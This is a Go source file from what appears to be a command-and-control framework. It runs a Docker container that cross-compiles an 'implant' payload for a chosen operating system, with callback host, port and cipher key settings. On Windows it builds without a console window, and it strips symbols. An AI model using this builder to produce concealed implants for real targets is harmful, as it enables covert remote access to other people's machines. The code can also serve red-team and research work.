package docker

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"xShell/controller/logger"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/api/types/mount"
	"github.com/docker/docker/client"
)

/*
Builder struct

Contains info on payload builder container.

Client -> Docker client connection

Config -> Builder configuration
*/
type Builder struct {
	Client *client.Client
	config *builderConfig
}

/*
Builder Config struct

Cmd -> Build command to run in container

Env -> Build enviornment variables to set in container

OS -> Target Operating System (windows, darwin, etc)

Arch -> Target CPU architecture

Host -> Host to call back to

Port -> Port to call back to

Key -> Serpent block cipher key
*/
type builderConfig struct {
	cmd  []string
	env  []string
	mnt  []mount.Mount
	os   string
	arch string
	host string
	port string
	key  string
}

/*
Create new Builder instance
*/
func NewBuilder(os, arch, host, port, key string) (*Builder, error) {
	// Create new Docker client
	cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
	if err != nil {
		return nil, err
	}
	// Populate Builder struct
	return &Builder{
		Client: cli,
		config: &builderConfig{
			os:   os,
			arch: arch,
			host: host,
			port: port,
			key:  key,
		},
	}, nil
}

/*
Generate build enviornment based on Builder configuration
*/
func (b *Builder) genBuildEnv() {
	// Set GOOS and GOARCH environment variables
	b.config.env = []string{fmt.Sprintf("GOOS=%s", b.config.os), fmt.Sprintf("GOARCH=%s", b.config.arch)}
	// Make build command
	switch b.config.os {
	case "windows":
		// GOOS=windows GOARCH=<target_arch> go build -v -ldflags -H 'windowsgui' -w -s -o <target_os>_<target_arch>.exe
		b.config.cmd = []string{"go", "build", "-v", "-ldflags", "-H 'windowsgui' -w -s", "-o", fmt.Sprintf("%s_%s.exe", b.config.os, b.config.arch)}
	case "darwin":
		// GOOS=darwin GOARCH=<target_arch> go build -v -ldflags -w -s -o <target_os>_<target_arch>
		b.config.cmd = []string{"go", "build", "-v", "-ldflags", "-w -s", "-o", fmt.Sprintf("%s_%s", b.config.os, b.config.arch)}
	case "linux":
		// GOOS=linux GOARCH=<target_arch> go build -v -ldflags -w -s -o <target_os>_<target_arch>
		b.config.cmd = []string{"go", "build", "-v", "-ldflags", "-w -s", "-o", fmt.Sprintf("%s_%s", b.config.os, b.config.arch)}
	default:
		// GOOS=windows GOARCH=<target_arch> go build -v -ldflags -H 'windowsgui' -w -s -o <target_os>_<target_arch>.exe
		b.config.cmd = []string{"go", "build", "-v", "-ldflags", "-H 'windowsgui' -w -s", "-o", fmt.Sprintf("%s_%s.exe", b.config.os, b.config.arch)}
	}
	volume, _ := filepath.Abs(".xshell/badger")
	// Add volume mounts
	b.config.mnt = []mount.Mount{
		{
			Type:   mount.TypeBind,
			Source: volume,
			Target: "/tmp/badger",
		},
	}
}

/*
Build payload with predefined Builder configuration
*/
func (b *Builder) Build() ([]byte, error) {
	// Close client after build
	defer b.Client.Close()
	// Configure container
	ctx := context.Background()
	b.genBuildEnv()
	resp, err := b.Client.ContainerCreate(ctx, &container.Config{
		Image:      "golang:1.21.4",
		Env:        b.config.env,
		Cmd:        b.config.cmd,
		WorkingDir: "/tmp/badger",
	}, &container.HostConfig{
		Mounts: b.config.mnt,
	}, nil, nil, "")
	if err != nil {
		return nil, err
	}
	logger.Log(logger.BUILD, fmt.Sprintf("%s", b.config.env))
	logger.Log(logger.BUILD, fmt.Sprintf("%s", b.config.cmd))
	// Start the container, run the build
	if err := b.Client.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{}); err != nil {
		return nil, err
	}
	// Wait for build to complete
	statusChan, errChan := b.Client.ContainerWait(ctx, resp.ID, container.WaitConditionNotRunning)
	select {
	case err := <-errChan:
		if err != nil {
			return nil, err
		}
	case <-statusChan:
		// We good
		// TODO: Add check and log that build succeed
	}
	// Fetch build logs
	out, err := b.Client.ContainerLogs(ctx, resp.ID, types.ContainerLogsOptions{ShowStdout: true, ShowStderr: true})
	if err != nil {
		// The build completed, we must continue
		logger.Log(logger.BUILD, err.Error())
	}
	if out != nil {
		logs, err := io.ReadAll(out)
		if err != nil {
			// Same deal here
			logger.Log(logger.BUILD, err.Error())
		} else {
			// Print build log
			logger.Log(logger.BUILD, string(logs))
		}
	}
	// Read implant binary
	implant, err := os.ReadFile(filepath.Join(".xshell", "badger", b.config.cmd[(len(b.config.cmd)-1)]))
	if err != nil {
		return nil, err
	}
	return implant, nil
}
